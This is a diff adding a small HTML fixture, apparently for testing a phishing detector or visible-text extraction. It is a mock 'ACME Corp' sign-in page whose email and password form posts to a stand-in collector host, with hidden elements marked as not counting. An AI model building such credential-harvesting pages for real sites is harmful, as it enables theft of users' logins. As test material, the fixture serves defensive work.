@@ -1,0 +1,25 @@
+<!doctype html>
+<html>
+  <head>
+    <title>ACME Corp — Sign in</title>
+    <style>
+      .x {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Welcome back to ACME Corp</h1>
+    <p style="display: none">hidden text should not count</p>
+    <span hidden>also hidden</span>
+    <form action="https://collector.example/post" method="post">
+      <input name="email" type="email" /><input name="password" type="password" /><button>
+        Sign in
+      </button>
+    </form>
+    <a href="https://acme-corp.com/help">Help</a>
+    <script>
+      var secret = "not visible";
+    </script>
+  </body>
+</html>
